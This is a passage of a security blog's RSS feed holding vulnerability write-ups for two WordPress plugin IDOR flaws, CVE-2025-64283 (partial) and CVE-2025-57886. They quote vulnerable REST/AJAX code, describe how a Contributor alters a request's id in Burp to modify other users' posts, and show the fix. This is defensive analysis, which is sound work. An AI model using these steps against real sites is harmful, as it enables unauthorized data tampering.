issue&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_fetch_lib&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_fetch_envato_template&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_get_installed_template&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_get_installed_templates&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_template_category&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-64283 stems from the plugin relying solely on &lt;strong&gt;nonce validation&lt;/strong&gt; for AJAX request authentication without enforcing &lt;strong&gt;role-based authorization checks&lt;/strong&gt;. This allows lower-privileged users (Contributor+) to control the &lt;code&gt;template&lt;/code&gt; parameter and access &lt;code&gt;_elementor_data&lt;/code&gt; of posts they do not own. Version 1.6.8 mitigates the issue by introducing a proper administrator-level capability check.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonces &lt;strong&gt;do not replace&lt;/strong&gt; authorization controls.&lt;/li&gt;&#xA;&lt;li&gt;WordPress AJAX actions must &lt;strong&gt;validate appropriate user capabilities&lt;/strong&gt;, not just authentication.&lt;/li&gt;&#xA;&lt;li&gt;User-controlled object identifiers (IDs) must be &lt;strong&gt;strictly bound to access permissions&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;IDOR vulnerabilities commonly arise from improperly enforced access control in AJAX logic.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/rometheme-for-elementor/vulnerability/wordpress-rtmkit-plugin-1-6-7-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ARTMKit Plugin &amp;lt;= 1.6.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-57886 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-22-cve-2025-57886/</link>
      <pubDate>Mon, 22 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-22-cve-2025-57886/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Authorization Bypass via User-Controlled Key&lt;/strong&gt; vulnerability in the &lt;strong&gt;Equalize Digital Accessibility Checker&lt;/strong&gt; plugin by &lt;strong&gt;Equalize Digital&lt;/strong&gt; allows exploitation of &lt;strong&gt;misconfigured access control levels&lt;/strong&gt;. This vulnerability affects &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt; from an &lt;strong&gt;unspecified&lt;/strong&gt; version up to &lt;strong&gt;1.30.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-57886&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-57886&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.30.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.30.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/accessibility-checker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Checker by Equalize Digital Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.30.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt; * &lt;code&gt;1.30.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registered a REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function init_rest_routes() {&#xA;    $ns      = &amp;#39;accessibility-checker/&amp;#39;;&#xA;    $version = &amp;#39;v1&amp;#39;;&#xA;&#xA;    add_action(&#xA;        &amp;#39;rest_api_init&amp;#39;,&#xA;        function () use ( $ns, $version ) {&#xA;            register_rest_route(&#xA;                $ns . $version,&#xA;                &amp;#39;/post-scan-results/(?P&amp;lt;id&amp;gt;\d&amp;#43;)&amp;#39;,&#xA;                [&#xA;                    &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;                    &amp;#39;callback&amp;#39;            =&amp;gt; [ $this, &amp;#39;set_post_scan_results&amp;#39; ],&#xA;                    &amp;#39;args&amp;#39;                =&amp;gt; [&#xA;                        &amp;#39;id&amp;#39; =&amp;gt; [&#xA;                            &amp;#39;validate_callback&amp;#39; =&amp;gt; function ( $param ) {&#xA;                                return is_numeric( $param );&#xA;                            },&#xA;                        ],&#xA;                    ],&#xA;                    &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                        return current_user_can( &amp;#39;edit_posts&amp;#39; );&#xA;                    },&#xA;                ]&#xA;            );&#xA;        }&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the logic of the code, we can draw several important points:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Namespace and route&lt;/strong&gt;&#xA;The endpoint is located under &lt;code&gt;accessibility-checker/v1&lt;/code&gt; with the route &lt;code&gt;/post-scan-results/{id}&lt;/code&gt;. The &lt;code&gt;id&lt;/code&gt; parameter is defined as a &lt;strong&gt;number&lt;/strong&gt;, thanks to the regex &lt;code&gt;\d+&lt;/code&gt; and &lt;code&gt;validate_callback&lt;/code&gt;. This is a basic check, but it does not verify if the &lt;code&gt;id&lt;/code&gt; exists or belongs to a specific post type.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;HTTP Method&lt;/strong&gt;&#xA;The route only accepts &lt;code&gt;POST&lt;/code&gt;, suggesting that this is an endpoint for &lt;strong&gt;writing or updating data&lt;/strong&gt;, not just reading.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Permission Check&lt;/strong&gt;&#xA;The &lt;code&gt;permission_callback&lt;/code&gt; only checks for the general capability &lt;code&gt;edit_posts&lt;/code&gt; (Contributor+). The decision to allow or deny the request &lt;strong&gt;is not based on a specific post&lt;/strong&gt;, meaning **a user with general permissions will be allowed to manipulate any &lt;code&gt;id**&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Processing Callback&lt;/strong&gt;&#xA;If permissions are bypassed, WordPress calls &lt;code&gt;set_post_scan_results&lt;/code&gt; with the &lt;code&gt;$id&lt;/code&gt; provided by the client. Here, the entire data processing logic completely &lt;strong&gt;trusts the &lt;code&gt;id&lt;/code&gt; value controlled by the client&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function set_post_scan_results( $request ) {&#xA;    if ( ! isset( $request[&amp;#39;violations&amp;#39;] ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;A required parameter is missing.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;    $post    = get_post( $post_id );&#xA;    if ( ! is_object( $post ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;The post is not valid.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $post_type  = get_post_type( $post );&#xA;    $post_types = Helpers::get_option_as_array( &amp;#39;edac_post_types&amp;#39; );&#xA;    if ( empty( $post_types ) || ! in_array( $post_type, $post_types, true ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;The post type is not set to be scanned.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $rules = edac_register_rules();&#xA;    $js_rule_ids = [];&#xA;    $combined_rule_ids = [];&#xA;    ...&#xA;&#xA;    try {&#xA;        do_action( &amp;#39;edac_before_validate&amp;#39;, $post_id, &amp;#39;js&amp;#39; );&#xA;&#xA;        $violations = $request[&amp;#39;violations&amp;#39;];&#xA;        edac_remove_corrected_posts( $post_id, $post-&amp;gt;post_type, 1, &amp;#39;js&amp;#39; );&#xA;&#xA;        if ( is_array( $violations ) &amp;amp;&amp;amp; count( $violations ) &amp;gt; 0 ) {&#xA;            foreach ( $violations as $violation ) {&#xA;                $rule_id = $violation[&amp;#39;ruleId&amp;#39;];&#xA;                $actual_rule_id = $combined_rule_ids[ $rule_id ] ?? $rule_id;&#xA;                if ( in_array( $actual_rule_id, $js_rule_ids, true ) ) {&#xA;                    ...&#xA;                    ( new Insert_Rule_Data() )-&amp;gt;insert( $post, $actual_rule_id, $impact, $html, $landmark, $landmark_selector, $selectors );&#xA;                    ...&#xA;                }&#xA;            }&#xA;        }&#xA;&#xA;        do_action( &amp;#39;edac_after_validate&amp;#39;, $post_id, &amp;#39;js&amp;#39; );&#xA;        edac_remove_corrected_posts( $post_id, $post-&amp;gt;post_type, 2, &amp;#39;js&amp;#39; );&#xA;&#xA;        $metrics = $request[&amp;#39;densityMetrics&amp;#39;] ?? [ 0, 0 ];&#xA;        update_post_meta( $post_id, &amp;#39;_edac_density_data&amp;#39;, [ $metrics[&amp;#39;elementCount&amp;#39;] ?? 0, $metrics[&amp;#39;contentLength&amp;#39;] ?? 0 ] );&#xA;&#xA;        ( new Summary_Generator( $post_id ) )-&amp;gt;generate_summary();&#xA;        update_post_meta( $post_id, &amp;#39;_edac_post_checked_js&amp;#39;, time() );&#xA;&#xA;        do_action( &amp;#39;edac_validate_before_sending_rest_response&amp;#39;, $post_id, &amp;#39;js&amp;#39;, $request );&#xA;&#xA;        return new \WP_REST_Response( [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;id&amp;#39; =&amp;gt; $post_id, &amp;#39;timestamp&amp;#39; =&amp;gt; time() ] );&#xA;&#xA;    } catch ( \Exception $ex ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; $ex-&amp;gt;getMessage() ], 500 );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function receives a request from the REST API and processes the accessibility scan results for a post. The main logic flow includes:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Input Validation&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $request[&amp;#39;violations&amp;#39;] ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Missing violations&amp;#39; ], 400);&#xA;}&#xA;$post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;$post = get_post( $post_id );&#xA;if ( ! is_object( $post ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Invalid post&amp;#39; ], 400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Post Type Check&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$post_type  = get_post_type( $post );&#xA;$post_types = Helpers::get_option_as_array( &amp;#39;edac_post_types&amp;#39; );&#xA;if ( empty( $post_types ) || ! in_array( $post_type, $post_types, true ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Post type not allowed&amp;#39; ], 400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Violation Processing&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$rules = edac_register_rules();&#xA;foreach ( $request[&amp;#39;violations&amp;#39;] as $violation ) {&#xA;    $rule_id = $violation[&amp;#39;ruleId&amp;#39;];&#xA;    // Filter valid rules and save to the database&#xA;    (new Insert_Rule_Data())-&amp;gt;insert( $post, $rule_id, $impact, $html, $landmark, $landmark_selector, $selectors );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Update Post Meta and Summary&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;update_post_meta( $post_id, &amp;#39;_edac_density_data&amp;#39;, [ $metrics[&amp;#39;elementCount&amp;#39;] ?? 0, $metrics[&amp;#39;contentLength&amp;#39;] ?? 0 ] );&#xA;( new Summary_Generator( $post_id ) )-&amp;gt;generate_summary();&#xA;update_post_meta( $post_id, &amp;#39;_edac_post_checked_js&amp;#39;, time() );&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Return Response&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;return new \WP_REST_Response([&#xA;    &amp;#39;success&amp;#39; =&amp;gt; true,&#xA;    &amp;#39;id&amp;#39; =&amp;gt; $post_id,&#xA;    &amp;#39;timestamp&amp;#39; =&amp;gt; time()&#xA;]);&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;An attacker with a &lt;strong&gt;Contributor account&lt;/strong&gt; can &lt;strong&gt;arbitrarily manipulate the client-controlled &lt;code&gt;id&lt;/code&gt; parameter&lt;/strong&gt;, pointing to &lt;strong&gt;any post&lt;/strong&gt;, while the permission check relies solely on &lt;code&gt;edit_posts&lt;/code&gt;. This allows the attacker to &lt;strong&gt;write or overwrite &lt;code&gt;violations&lt;/code&gt; data on posts they do not own&lt;/strong&gt;, leading to &lt;strong&gt;unauthorized modification of other users&amp;rsquo; data (IDOR)&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;When creating a post with a Contributor user, you will see the &lt;strong&gt;Accessibility Checker&lt;/strong&gt; statistics appear directly on the post editing page.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/post.png&#34; title=&#34;Thống kê của Accessibility Checker&#34; data-thumbnail=&#34;/posts/2025-12-22-cve-2025-57886/post.png&#34; data-sub-html=&#34;&lt;h2&gt;Post&lt;/h2&gt;&lt;p&gt;Thống kê của Accessibility Checker&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-22-cve-2025-57886/post.png&#39; alt=&#34;Post&#34; height=&#34;1048&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thống kê của Accessibility Checker&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;By filtering requests with the phrase &lt;code&gt;post-scan-results&lt;/code&gt; in Burp History, you can capture a valid request provided by the plugin:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/request.png&#34; title=&#34;Filter request trong Burp History&#34; data-thumbnail=&#34;/posts/2025-12-22-cve-2025-57886/request.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Filter request trong Burp History&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-22-cve-2025-57886/request.png&#39; alt=&#34;Request&#34; height=&#34;1357&#34; width=&#34;1277&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Filter request trong Burp History&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Simply by modifying the &lt;code&gt;id&lt;/code&gt; value, one can &lt;strong&gt;unauthorizedly modify data&lt;/strong&gt; in another person&amp;rsquo;s post.&lt;/p&gt;&#xA;&lt;p&gt;Version &lt;strong&gt;v1.30.1&lt;/strong&gt; fixed the vulnerability by changing the &lt;strong&gt;permission callback&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;    return $this-&amp;gt;user_can_edit_passed_post_id( $request );&#xA;}&#xA;&#xA;public function user_can_edit_passed_post_id( $request ) {&#xA;    $post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;    return current_user_can( &amp;#39;edit_post&amp;#39;, $post_id );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;The callback now receives &lt;code&gt;$request&lt;/code&gt; to check a &lt;strong&gt;specific post&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Uses &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt; → WordPress verifies:&lt;/li&gt;&#xA;&lt;li&gt;Whether the user has permission to edit this post.&lt;/li&gt;&#xA;&lt;li&gt;Whether the post is owned by the user.&lt;/li&gt;&#xA;&lt;li&gt;Whether the post status (draft, published, private) allows the operation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 